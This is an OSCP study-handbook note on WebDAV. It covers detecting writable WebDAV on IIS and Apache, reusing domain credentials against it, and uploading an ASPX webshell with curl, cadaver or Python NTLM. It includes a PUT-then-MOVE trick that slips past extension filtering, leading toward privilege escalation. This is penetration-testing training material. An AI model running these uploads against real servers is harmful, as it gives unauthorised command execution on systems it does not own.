---
title: "WebDAV"
slug: webdav
category: notes
handbook: oscp
tags: ["webdav"]
draft: false
pubDatetime: 2026-08-03T22:49:06+03:00
modDatetime: 2026-08-03T22:49:06+03:00
description: "WebDAV (RFC 4918) extends HTTP with verbs that turn a web server into a writable filesystem: `PROPFIND` to list, `MKCOL` to create a directory, and `PUT`, `DELETE`, `COPY`, `MOVE`, `LOCK` to manage files."
---
WebDAV (RFC 4918) extends HTTP with verbs that turn a web server into a writable filesystem: `PROPFIND` to list, `MKCOL` to create a directory, and `PUT`, `DELETE`, `COPY`, `MOVE`, `LOCK` to manage files. It ships as an optional role service on IIS and as `mod_dav` on Apache.

Only one consequence matters here. `PUT` writes a file into a directory the web server also executes from, so a valid WebDAV account is a direct route from credentials to command execution. Nothing is exploited, the feature does what it was built to do.

## The Credential Link

IIS WebDAV authenticates against Windows accounts over NTLM or Negotiate, not against an application login. A domain or local credential recovered anywhere else is therefore already a WebDAV credential. On Hutch a password sitting in an LDAP `description` field, found through anonymous bind as in [Active Directory Enumeration](/collections/oscp/active-directory-enumeration), was the same credential that authenticated to IIS on port 80.

This is why HTTP belongs alongside SMB, LDAP, and WinRM in the list of services to replay credentials against on a Windows target. A web port that authenticates against the directory is not a separate attack surface from the domain.

## Detection

`OPTIONS` answers directly:

```bash
curl -i -X OPTIONS http://TARGET/
```

```
HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
Server: Microsoft-IIS/10.0
Public: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
DAV: 1,2,3
MS-Author-Via: DAV
```

The `DAV:` header is required by the RFC for any DAV-compliant resource, so it is a definitive answer rather than an inference. `MS-Author-Via: DAV` is the IIS-specific version of the same statement.

### Allow Against Public

The two method lists mean different things and routinely disagree:

- `Public` is what the server supports across every resource.
- `Allow` is what the requested URI supports.

In the response above `PUT` appears in `Public` but not in `Allow`, which reads like PUT is disabled and is not. The request was for `/`, which resolves to a directory, and a directory cannot be the target of a PUT. Repeat the request against a filename that does not exist yet and `Allow` changes:

```bash
curl -i -X OPTIONS http://TARGET/test.txt
```

Do not conclude anything from `Allow` on a directory URI.

### Reading the Auth Requirement

A `200` with no `WWW-Authenticate` header means OPTIONS was served anonymously. It says nothing about writes, since IIS commonly permits anonymous reads while requiring authentication on the DAV verbs. The scheme is named by the first write attempt, not by OPTIONS, so test it with an inert file before introducing the extension question:

```bash
echo test > /tmp/test.txt
curl -i -T /tmp/test.txt http://TARGET/test.txt
```

`201` is an anonymous write and no credentials are needed. `401` finally carries the `WWW-Authenticate` line that decides the client below.

From nmap:

```bash
nmap -p 80 --script http-webdav-scan,http-methods --script-args http-methods.test-all TARGET
```

`http-methods` alone reports only the advertised `Allow` list; `test-all` sends each verb to see which are genuinely accepted, which matters because servers routinely advertise methods they reject and reject methods they never advertised.

`davtest` goes further and answers the question that actually decides the outcome, which extensions can be both written and run:

```bash
davtest -url http://TARGET
davtest -url http://TARGET -auth 'user:password'
```

It uploads a test file per extension and then requests each one. `SUCCEED` means the file was written, `EXEC` means the server executed it. Both are needed. A directory that accepts every upload and executes none is a dead end, and this is the fastest way to learn that.

WebDAV on a domain controller's IIS is not part of a default install, so finding it enabled is itself a signal that it is the intended path.

## Uploading a Shell

Match the extension to the server: `.aspx` on IIS, `.php` on Apache. Kali's set lives at `/usr/share/webshells/`, and `aspx/cmdasp.aspx` is the usual IIS choice. See [Webshells](/collections/oscp/webshells) for the payloads themselves.

The client is chosen by the authentication scheme in the `WWW-Authenticate` header, not by preference.

### Basic

`curl` handles this with no extra package, and `-T` is PUT:

```bash
curl -T /usr/share/webshells/aspx/cmdasp.aspx -u 'user:password' http://TARGET/cmdasp.aspx
```

### NTLM or Negotiate

The obvious extension is `--ntlm`, but NTLM is a compile-time feature of libcurl rather than a plain flag:

```
curl: option --ntlm: the installed libcurl version does not support this
```

Check what the local build actually has before assuming the flag exists:

```bash
curl -V        # read the Features: line for NTLM
```

No combination of flags adds it back, so on a build without NTLM the tool has to change. `cadaver` speaks NTLM through neon, which makes it the default choice against IIS rather than a legacy fallback. It went unmaintained for over a decade, was picked up again by neon's author, and 0.28 reached Debian testing in December 2025, so it is current and installable:

```bash
sudo apt install -y cadaver
cadaver http://TARGET/
# prompts for username and password
dav:/> ls
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx
```

Credentials can go in `~/.netrc` instead of the prompt, which matters when the session is scripted or the prompt is awkward to drive:

```bash
echo "machine TARGET login user password password" > ~/.netrc
chmod 600 ~/.netrc
```

Where cadaver is unavailable, `requests_ntlm` does the same PUT:

```bash
pip install requests_ntlm
python3 -c "
import requests
from requests_ntlm import HttpNtlmAuth
data = open('/usr/share/webshells/aspx/cmdasp.aspx','rb').read()
r = requests.put('http://TARGET/cmdasp.aspx', data=data,
                 auth=HttpNtlmAuth('DOMAIN\\\\user','password'))
print(r.status_code)
"
```

The domain prefix is dropped entirely for a local account. When it is needed, it is the short NetBIOS name (`hutch\user`), not the FQDN, and in a shell single-quote it so the backslash survives.

### Confirming It Landed

A `201 Created` means the file was written. `204 No Content` means it overwrote something already there, which is equally fine. `401` is authentication, `403` is request filtering on the extension, and `405 Method Not Allowed` means `PUT` is not enabled on that path even though `OPTIONS` advertised it.

Request the file and run `whoami` through it:

```
http://TARGET/cmdasp.aspx
```

`cmdasp.aspx` renders a text box and a Run button rather than taking a URL parameter, so the command goes in the box. Source returned as plain text instead of a form means the directory is not executing `.aspx`, which is the write-versus-execute split below rather than a failed upload.

An IIS shell lands as the application pool identity, usually `iis apppool\defaultapppool`, which holds `SeImpersonatePrivilege` by default. That makes the route out a reverse shell followed by a token attack, so verify the privilege before spending time elsewhere:

```
whoami /priv
```

See [Reverse Shells](/collections/oscp/reverse-shells) for upgrading the webshell and [Windows Token Privileges](/collections/oscp/windows-token-privileges) for what to do with `SeImpersonatePrivilege`.

## When PUT Is Filtered

IIS request filtering commonly blocks `PUT` on executable extensions while leaving `MOVE` untouched, because the rename is treated as a file operation rather than an upload. Write the file under an inert name, then rename it server-side:

```bash
curl -T cmdasp.aspx -u 'user:password' http://TARGET/cmdasp.txt
curl -X MOVE -u 'user:password' -H 'Destination: http://TARGET/cmdasp.aspx' http://TARGET/cmdasp.txt
```

`Destination` takes a full URL, not a path. `COPY` works the same way when the original should stay in place. Add whichever auth flags the scheme required above, or do it from a cadaver session where the same two steps are `put cmdasp.aspx cmdasp.txt` followed by `move cmdasp.txt cmdasp.aspx`.

## Write Path Against Execute Path

WebDAV is often scoped to a subdirectory such as `/webdav/` or `/uploads/` rather than the web root, and that directory frequently has script execution disabled. The result is a successful upload that returns the file's source as plain text, or downloads it, instead of running it. This is the same split described in [Webshells](/collections/oscp/webshells): what accepts the file and what executes it are separate rules.

Establish where the write actually lands relative to the served root before concluding the upload failed. `davtest` reports it, and `PROPFIND` enumerates the writable tree:

```bash
curl -X PROPFIND -H 'Depth: 1' -u 'user:password' http://TARGET/
```

If writes are confined to a non-executing directory, WebDAV is still a file-write primitive worth keeping, just not a shell on its own.
